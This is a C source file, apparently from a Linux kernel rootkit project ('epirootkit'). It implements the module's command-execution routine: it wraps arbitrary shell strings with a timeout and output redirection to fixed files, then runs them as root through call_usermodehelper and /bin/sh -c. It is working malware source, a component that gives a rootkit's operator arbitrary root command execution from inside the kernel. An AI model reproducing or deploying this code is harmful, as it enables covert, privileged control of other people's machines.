#include <linux/slab.h>
#include <linux/string.h>
#include <linux/kmod.h>
#include <linux/types.h>

#include "epirootkit.h"

static char *trim_leading_whitespace(char *str) {
    while (*str == ' ' || *str == '\t' || *str == '\n')
        str++;
    return str;
}

// I hate One Direction
static void detect_redirections(const char *cmd, bool *redirect_stdout, bool *redirect_stderr) {
    char *redirect_stderr_add = strstr(cmd, "2>");
    char *redirect_stdout_add = strstr(cmd, ">");

    *redirect_stderr = (redirect_stderr_add != NULL);
    *redirect_stdout = (redirect_stdout_add != redirect_stderr_add && redirect_stdout_add != NULL);
}

static char *build_timeout_prefix(int timeout) {
    if (timeout <= 0)
        return kstrdup("", GFP_KERNEL);

    const char *base_cmd = "timeout --signal=SIGKILL --preserve-status";
    int size = snprintf(NULL, 0, "%s %d", base_cmd, timeout);
    char *timeout_cmd = kzalloc(size + 1, GFP_KERNEL);
    if (!timeout_cmd)
        return NULL;

    snprintf(timeout_cmd, size + 1, "%s %d", base_cmd, timeout);
    return timeout_cmd;
}

static int build_full_command(char *buffer, size_t buffer_size,
                              const char *timeout_cmd, const char *user_cmd,
                              bool redirect_stdout, bool redirect_stderr,
                              bool catch_stds, const char *stdout_file, const char *stderr_file) {
    const char *format;

    if ((redirect_stderr && redirect_stdout) || !catch_stds) {
        format = "%s %s";
        return snprintf(buffer, buffer_size, format, timeout_cmd, user_cmd) >= buffer_size ? -EINVAL : 0;
    } else if (redirect_stderr) {
        format = "%s %s > %s";
        return snprintf(buffer, buffer_size, format, timeout_cmd, user_cmd, stdout_file) >= buffer_size ? -EINVAL : 0;
    } else if (redirect_stdout) {
        format = "%s %s 2> %s";
        return snprintf(buffer, buffer_size, format, timeout_cmd, user_cmd, stderr_file) >= buffer_size ? -EINVAL : 0;
    } else {
        format = "%s %s > %s 2> %s";
        return snprintf(buffer, buffer_size, format, timeout_cmd, user_cmd, stdout_file, stderr_file) >= buffer_size ? -EINVAL : 0;
    }
}

static int execute_command(const char *cmd_str, char *envp[]) {
    char *argv[] = { "/bin/sh", "-c", (char *)cmd_str, NULL };
    struct subprocess_info *sub_info;

    sub_info = call_usermodehelper_setup(argv[0], argv, envp, GFP_KERNEL, NULL, NULL, NULL);
    if (!sub_info)
        return -ENOMEM;

    return call_usermodehelper_exec(sub_info, UMH_WAIT_PROC);
}

int exec_str_as_command_with_timeout(char *user_cmd, bool catch_stds, int timeout) {
    char *cmd_buffer = NULL;
    char *timeout_cmd = NULL;
    bool redir_stdout = false, redir_stderr = false;
    int status = 0;

    static char *envp[] = {
        "HOME=/",
        "TERM=xterm",
        "PATH=/sbin:/bin:/usr/sbin:/usr/bin:/tmp",
        NULL
    };

    user_cmd = trim_leading_whitespace(user_cmd);

    cmd_buffer = kmalloc(STD_BUFFER_SIZE, GFP_KERNEL);
    if (!cmd_buffer)
        return -ENOMEM;

    detect_redirections(user_cmd, &redir_stdout, &redir_stderr);

    timeout_cmd = build_timeout_prefix(timeout);
    if (!timeout_cmd) {
        kfree(cmd_buffer);
        return -ENOMEM;
    }

    status = build_full_command(cmd_buffer, STD_BUFFER_SIZE,
                                 timeout_cmd, user_cmd,
                                 redir_stdout, redir_stderr,
                                 catch_stds, STDOUT_FILE, STDERR_FILE);

    if (status < 0) {
        DBG_MSG("Command too long or invalid\n");
        kfree(cmd_buffer);
        kfree(timeout_cmd);
        return status;
    }

    DBG_MSG("exec_str_as_command: executing command: %s\n", cmd_buffer);

    status = execute_command(cmd_buffer, envp);
    DBG_MSG("exec_str_as_command: command exited with status: %d\n", status);

    kfree(cmd_buffer);
    kfree(timeout_cmd);

    return status;
}
